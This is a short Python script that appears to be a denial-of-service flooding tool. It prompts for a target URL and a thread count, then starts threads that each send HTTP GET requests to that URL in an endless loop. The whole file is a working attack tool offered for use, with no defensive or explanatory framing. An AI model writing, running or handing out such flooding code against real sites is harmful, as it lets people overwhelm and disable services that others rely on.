import threading
import requests

def dos_inf(target):
    while True:
        try:
            response = requests.get(target)
            print('Terminal sent response')
        except:
            print('Error : (unknwn, attack failed)')

site = input('Type URL : ')

if site[0:4] == 'http':
        threads = int(input('Type a count of threads (type 0, for setting default settings - 20 threads): '))
        if threads == 0:
            threads = 20

        for i in range(0, threads):
            thr = threading.Thread(target = dos_inf, args = (site,))
            thr.start()
